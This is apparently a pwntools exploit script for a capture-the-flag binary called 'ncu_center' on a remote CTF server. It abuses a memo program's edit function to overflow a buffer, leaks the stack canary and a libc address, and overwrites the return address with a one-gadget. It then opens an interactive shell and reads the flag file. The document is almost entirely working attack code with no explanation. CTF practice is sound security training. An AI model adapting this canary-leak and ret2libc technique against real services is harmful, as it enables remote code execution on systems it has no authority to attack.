from pwn import *
import time

def store_memo(n, string):
    r.sendafter('Your choice:\n', '2')
    r.sendafter('want to store in (1 , 2 , 3)?:', str(n))
    r.sendafter('store in mem page %s :' % (str(n)), string)
    print "store_memo:", str(n), "content:", string

def show_memo(n):
    r.sendafter('Your choice:\n', '3')
    r.sendafter('want to see (1 , 2 , 3)?:', str(n))
    line = r.recvuntil('\n').strip()
    print "show_memo:", str(n), "content:", line
    return line

def edit_memo(n, string):
    r.sendafter('Your choice:\n', '4')
    r.sendafter('want to edit (1 , 2 , 3)?:', str(n))
    r.sendafter('Edit memo page 4 :', string)
    print 'edit:', str(n), ", str:", string

context.arch = 'amd64'
local = False

if local:
    r = process('./ncu_center')
else:
    r = remote('ctf.adl.csie.ncu.edu.tw', 11008)

store_memo(1, 'a' * 16)
time.sleep(0.3)
store_memo(2, 'b' * 16)
time.sleep(0.3)
store_memo(3, 'c' * 16)
time.sleep(0.3)
edit_memo(1, 'a' * 16)
print r.recvline()[:-1]
edit_memo(3, 'c' * 16 + 'd' * 9)
print r.recvline()[:-1]
canary = show_memo(3)
# print "canary length:", len(canary)
canary = u64(canary[39:39+7].ljust(8, '\x00'))
print "canary:", hex(canary)
edit_memo(3, 'c' * 24 + '\x00')
print r.recvline()[:-1]
edit_memo(1, 'a' * 16)
print r.recvline()[:-1]
edit_memo(3, 'c' * 56)
print r.recvline()[:-1]
libc_start = show_memo(3)
print libc_start
libc_start = u64(libc_start[70:].ljust(8, '\x00'))
libc_start_offset = 0x20740
libc = libc_start - 240 - libc_start_offset
print "libc:", hex(libc)
payload = 'c' * 24 + p64(int((hex(canary)+'00'), 16)) + 'c' * 24 + p64(libc + 0xf0897)[:-2]
edit_memo(3, payload)
r.sendafter('Your choice:\n', '5')
time.sleep(0.2)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
